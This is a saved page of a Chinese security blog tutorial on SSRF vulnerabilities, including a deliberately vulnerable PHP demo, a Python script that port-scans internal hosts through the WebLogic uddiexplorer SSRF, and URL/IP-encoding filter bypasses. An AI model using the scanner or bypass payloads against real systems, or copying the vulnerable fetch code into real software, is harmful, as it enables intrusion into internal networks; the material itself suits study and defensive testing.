@@ -1,0 +1,1361 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="渗透测试,WAF绕过,自动化,SSRF,内网渗透," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="w2n1ck" type="application/atom+xml" />
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="最近玩的时候想找一下SSRF的相关知识，去自己博客上一看，WTF竟然还没有！好吧。。那就写一个吧，方便自己以后查看，大牛们多多指点。">
+<meta name="keywords" content="渗透测试,WAF绕过,自动化,SSRF,内网渗透">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSRF漏洞剖析与利用">
+<meta property="og:url" content="http://byd.dropsec.xyz/2017/06/04/SSRF漏洞剖析与利用/index.html">
+<meta property="og:site_name" content="w2n1ck">
+<meta property="og:description" content="最近玩的时候想找一下SSRF的相关知识，去自己博客上一看，WTF竟然还没有！好吧。。那就写一个吧，方便自己以后查看，大牛们多多指点。">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssrf1.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssrf2.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssrf3.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssrf4.png">
+<meta property="og:image" content="http://oa8y5guqs.bkt.clouddn.com/ssrf5.png">
+<meta property="og:updated_time" content="2017-07-28T12:07:12.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SSRF漏洞剖析与利用">
+<meta name="twitter:description" content="最近玩的时候想找一下SSRF的相关知识，去自己博客上一看，WTF竟然还没有！好吧。。那就写一个吧，方便自己以后查看，大牛们多多指点。">
+<meta name="twitter:image" content="http://oa8y5guqs.bkt.clouddn.com/ssrf1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    sidebar: {"position":"left","display":"hide","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"输入关键词进行搜索","hits_empty":"找不到关于“${query}”的文章","hits_stats":"共找到 ${hits} 篇文化在那个，花了 ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://byd.dropsec.xyz/2017/06/04/SSRF漏洞剖析与利用/"/>
+
+
+
+
+
+  <title>SSRF漏洞剖析与利用 | w2n1ck</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?61c879c1c104a92aab1d6e4b6888ffe5";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">w2n1ck</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">Looking at yourself from a different Angle!</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tools">
+          <a href="/daima" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wrench"></i> <br />
+            
+            工具
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-daohang">
+          <a href="/daohang" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-globe"></i> <br />
+            
+            导航
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://byd.dropsec.xyz/2017/06/04/SSRF漏洞剖析与利用/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="w2n1ck">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="w2n1ck">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">SSRF漏洞剖析与利用</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-04T11:26:49+08:00">
+                2017-06-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/06/04/SSRF漏洞剖析与利用/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/06/04/SSRF漏洞剖析与利用/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计</span>
+                
+                <span title="字数统计">
+                  
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>最近玩的时候想找一下SSRF的相关知识，去自己博客上一看，WTF竟然还没有！好吧。。那就写一个吧，方便自己以后查看，大牛们多多指点。<br><a id="more"></a></p>
+<h1 id="Know-it"><a href="#Know-it" class="headerlink" title="Know it"></a>Know it</h1><p>(让我装个逼，模仿下猪猪侠的词。。。)</p>
+<h2 id="什么是SSRF"><a href="#什么是SSRF" class="headerlink" title="什么是SSRF"></a>什么是SSRF</h2><p>Freebuf:很多web应用都提供了从其他的服务器上获取数据的功能。使用用户指定的URL，web应用可以获取图片，下载文件，读取文件内容等。这个功能如果被恶意使用，可以利用存在缺陷的web应用作为代理攻击远程和本地的服务器。这种形式的攻击称为服务端请求伪造攻击（Server-side Request Forgery）</p>
+<p>一句话就是：利用一个可以发起网络请求的服务，当作跳板来攻击其他服务。</p>
+<h2 id="SSRF能干什么"><a href="#SSRF能干什么" class="headerlink" title="SSRF能干什么"></a>SSRF能干什么</h2><ul>
+<li>探测内网信息</li>
+<li>攻击内网或本地其他服务</li>
+<li>穿透防火墙</li>
+<li>。。。</li>
+</ul>
+<h2 id="怎么找SSRF漏洞"><a href="#怎么找SSRF漏洞" class="headerlink" title="怎么找SSRF漏洞"></a>怎么找SSRF漏洞</h2><ul>
+<li>能够对外发起网络请求的地方</li>
+<li>请求远程服务器资源的地方</li>
+<li>数据库内置功能</li>
+<li>邮件系统</li>
+<li>文件处理</li>
+<li>。。。</li>
+</ul>
+<p>举几个例子：</p>
+<ul>
+<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
+<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
+<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
+<li>邮件系统就是接收邮件服务器地址这些地方。</li>
+<li>文件就找ImageMagick，xml这些。</li>
+<li>从URL关键字中寻找，比如：<code>source</code>,<code>share</code>,<code>link</code>,<code>src</code>,<code>imageurl</code>,<code>target</code>等。</li>
+</ul>
+<h2 id="SSRF怎么形成的"><a href="#SSRF怎么形成的" class="headerlink" title="SSRF怎么形成的"></a>SSRF怎么形成的</h2><p>SSRF形成的原因就是由于服务端提供了能够发起网络请求或者从其他服务器获取相关资源数据等，但是没有对相关目标地址做任何的限制或过滤，从而导致SSRF漏洞。</p>
+<h1 id="Hack-it"><a href="#Hack-it" class="headerlink" title="Hack it"></a>Hack it</h1><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>主要模仿curl来请求资源，写入相关文件，之后并显示相关数据。</p>
+<p><strong>ssrf.html</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">	&lt;title&gt;ssrf test&lt;/title&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;center&gt;</div><div class="line">	&lt;form name=&quot;input&quot; action=&quot;ssrf.php&quot; method=&quot;POST&quot;&gt;</div><div class="line">	&lt;h2&gt;Search: &lt;input type=&quot;text&quot; name=&quot;url&quot;&gt;&lt;/h2&gt;</div><div class="line">	&lt;input type=&quot;submit&quot; value=&quot;Submit&quot;&gt;</div><div class="line">&lt;/form&gt;</div><div class="line">&lt;/center&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
+<p><strong>ssrf.php</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">if(isset($_POST[&apos;url&apos;]))&#123;</div><div class="line">   $link = $_POST[&apos;url&apos;];</div><div class="line">   $filename = &apos;./&apos;.rand().&apos;.txt&apos;;</div><div class="line">   $curlobj = curl_init($link);</div><div class="line">   $fp = fopen($filename,&quot;w&quot;);</div><div class="line">   curl_setopt($curlobj,CURLOPT_FILE,$fp);</div><div class="line">   curl_setopt($curlobj,CURLOPT_HEADER,0);</div><div class="line">   curl_exec($curlobj);</div><div class="line">   curl_close($curlobj);</div><div class="line">   fclose($fp);</div><div class="line">   $fp = fopen($filename,&quot;r&quot;);</div><div class="line">   $result = fread($fp,filesize($filename));</div><div class="line">   fclose($fp);</div><div class="line">   echo $result;</div><div class="line">&#125;</div><div class="line">?&gt;</div></pre></td></tr></table></figure></p>
+<p>这里使用192.168.1.113作为边界服务器，192.168.2.3作为内网服务器。<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf1.png" alt=""><br>数据内网服务器地址<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf2.png" alt=""><br>成功显示内网服务器信息</p>
+<h2 id="漏洞实践"><a href="#漏洞实践" class="headerlink" title="漏洞实践"></a>漏洞实践</h2><p>这里以weblogic的SSRF为例(猪猪侠所说的神洞)。如图显示则就是存在SSRF漏洞了。<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf3.png" alt=""></p>
+<p>好了，到现在咱们已经知道存在这个漏洞了，然后应该怎样快速定位该服务器所在的内网地址呢?</p>
+<p>这里目前我知道的有三种方法：</p>
+<ol>
+<li>使用脚本爆破<code>192.168.*.*</code>，<code>172.16.*.*-172.31.*.*</code>，<code>10.*.*.*</code>这三个内网段</li>
+<li>使用burp爆破同上</li>
+<li>使用<code>file:///</code> ，<code>gophar://</code>，<code>ftp://</code>等这些服务器允许的协议去读取proc里可能包含IP地址信息的相关文件</li>
+</ol>
+<p>这里我就先简单粗暴的使用burp来一发吧。<br><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf4.png" alt=""></p>
+<p>。。。运气真特么的好。</p>
+<h2 id="内网探测"><a href="#内网探测" class="headerlink" title="内网探测"></a>内网探测</h2><p>探测内网内的所有主机及开放的端口信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div></pre></td><td class="code"><pre><div class="line"># -*- coding: UTF-8 -*-</div><div class="line">&apos;&apos;&apos;</div><div class="line">@Author：w2n1ck</div><div class="line">@Index：http://www.w2n1ck.com/</div><div class="line">&apos;&apos;&apos;</div><div class="line">import Queue</div><div class="line">from threading import Thread</div><div class="line">import threading</div><div class="line">import urllib</div><div class="line">import urllib2</div><div class="line">import re</div><div class="line">import requests</div><div class="line"></div><div class="line">base_url = &apos;http://xxx.xxx.xxx&apos;</div><div class="line">thread_list=[]</div><div class="line"></div><div class="line">port_list = [21,22,23,25,69,80,81,82,83,84,110,389,398,443,445,488,512,513,514,873,901,1043,1080,1099,1090,1158,1352,1433,1434,1521,2049,2100,2181,2601,2604,3128,3306,3307,3389,4440,4444,4445,4848,5000,5280,5432,5500,5632,5900,5901,5902,5903,5984,6000,6033,6082,6379,6666,7001,7001,7002,7070,7101,7676,7777,7899,7988,8000,8001,8002,8003,8004,8005,8006,8007,8008,8009,8069,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,8091,8092,8093,8094,8095,8098,8099,8980,8990,8443,8686,8787,8880,8888,9000,9001,9043,9045,9060,9080,9081,9088,9088,9090,9091,9100,9200,9300,9443,9871,9999,10000,10068,10086,11211,20000,22022,22222,27017,28017,50060,50070]</div><div class="line"></div><div class="line">que = Queue.Queue()</div><div class="line">lock = threading.Lock()</div><div class="line"></div><div class="line">for port in port_list:</div><div class="line">    que.put(port)</div><div class="line">def run():</div><div class="line">    for i in range(1,256):</div><div class="line">        while que.qsize() &gt; 0:</div><div class="line">            port = que.get()</div><div class="line">            #print &quot;ip:172.16.2.&#123;ip&#125;:&#123;port&#125;&quot;.format(ip=i,port=port)</div><div class="line">            url = &quot;http://xxx.xxx.xxx/uddiexplorer/SearchPublicRegistries.jsp?operator=http://172.16.2.%d:%d&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&quot; % (i,port)</div><div class="line">            try:</div><div class="line">                content = requests.get(url,timeout=20,verify=False).content</div><div class="line">                #ssrf检测</div><div class="line">                result1 = re.findall(&apos;weblogic.uddi.client.structures.exception.XML_SoapException&apos;,content)</div><div class="line">                result2 = re.findall(&apos;but could not connect&apos;,content)</div><div class="line">                result3 = re.findall(&apos;No route to host&apos;,content)</div><div class="line">                if len(result1) != 0 and len(result2) == 0 and len(result3) == 0:</div><div class="line">                        print &quot;http://172.16.2.&#123;ip&#125;:&#123;port&#125; is open&quot;.format(ip=i,port=port)</div><div class="line">            except Exception,e:</div><div class="line">                    pass</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    for i in xrange(20):</div><div class="line">        t=Thread(target=run)</div><div class="line">        thread_list.append(t)</div><div class="line">    for t in thread_list:</div><div class="line">        t.start()</div><div class="line">    for t in thread_list:</div><div class="line">        t.join()</div></pre></td></tr></table></figure></p>
+<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssrf5.png" alt=""></p>
+<h2 id="SSRF绕过技巧"><a href="#SSRF绕过技巧" class="headerlink" title="SSRF绕过技巧"></a>SSRF绕过技巧</h2><h3 id="1、"><a href="#1、" class="headerlink" title="1、@"></a>1、@</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">http://abc@127.0.0.1</div><div class="line">实际上是以用户名abc连接到站点127.0.0.1，同理</div><div class="line">http://8.8.8.8@127.0.0.1:8080、http://127.0.0.1#8.8.8.8</div></pre></td></tr></table></figure>
+<h3 id="2、添加端口号"><a href="#2、添加端口号" class="headerlink" title="2、添加端口号"></a>2、添加端口号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:8080</div></pre></td></tr></table></figure>
+<h3 id="3、短地址"><a href="#3、短地址" class="headerlink" title="3、短地址"></a>3、短地址</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://ᄒ.ws/ir</div></pre></td></tr></table></figure>
+<h3 id="4、特殊域名"><a href="#4、特殊域名" class="headerlink" title="4、特殊域名"></a>4、特殊域名</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">10.0.0.1.xip.io == 10.0.0.1</div><div class="line">www.10.0.0.1.xip.io == 10.0.0.1</div><div class="line">fuzz.ssrf.10.0.0.1.xip.io == 10.0.0.1</div></pre></td></tr></table></figure>
+<h3 id="5、ip进制转换"><a href="#5、ip进制转换" class="headerlink" title="5、ip进制转换"></a>5、ip进制转换</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">首先以 . 分割数字</div><div class="line">然后进行10进制转换16进制</div><div class="line">然后把这串十六进制合在一起再转换成8进制</div><div class="line">然后指定协议 http://，可用任意个 0 作为前缀：http://000007F000001；</div><div class="line">（在前面添加过多的 0，在实际SSRF或者XSS中有时会成为绕过过滤的大杀器）</div><div class="line"></div><div class="line">1、利用八进制IP地址绕过</div><div class="line">ping -w 0 -n 1 012.0.0.1</div><div class="line">2、利用十六进制IP地址绕过</div><div class="line">ping -w 0 -n 1 0xa.0.0.1</div><div class="line">3、 利用十进制的IP地址绕过</div><div class="line">ping -w 0 -n 1 167772161</div><div class="line">在PHP里使用ip2long</div><div class="line">在Python里使用inet_aton</div><div class="line">4、利用IP地址的省略写法绕过</div><div class="line">ping -w 0 -n 1 10.1</div></pre></td></tr></table></figure>
+<h1 id="SSRF防御"><a href="#SSRF防御" class="headerlink" title="SSRF防御"></a>SSRF防御</h1><p>推荐参考：<br><a href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html" target="_blank" rel="external">谈一谈如何在Python开发中拒绝SSRF漏洞</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="w2n1ck WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="w2n1ck Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      w2n1ck
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2017/06/04/SSRF漏洞剖析与利用/" title="SSRF漏洞剖析与利用">http://byd.dropsec.xyz/2017/06/04/SSRF漏洞剖析与利用/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/WAF绕过/" rel="tag"><i class="fa fa-tag"></i> WAF绕过</a>
+          
+            <a href="/tags/自动化/" rel="tag"><i class="fa fa-tag"></i> 自动化</a>
+          
+            <a href="/tags/SSRF/" rel="tag"><i class="fa fa-tag"></i> SSRF</a>
+          
+            <a href="/tags/内网渗透/" rel="tag"><i class="fa fa-tag"></i> 内网渗透</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/06/02/爬虫入库实战之免费代理/" rel="next" title="爬虫入库实战之干死反爬虫">
+                <i class="fa fa-chevron-left"></i> 爬虫入库实战之干死反爬虫
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/06/05/渗透测试小技巧之过waf木马/" rel="prev" title="渗透测试小技巧之过waf木马">
+                渗透测试小技巧之过waf木马 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="w2n1ck" />
+          <p class="site-author-name" itemprop="name">w2n1ck</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">74</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">53</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
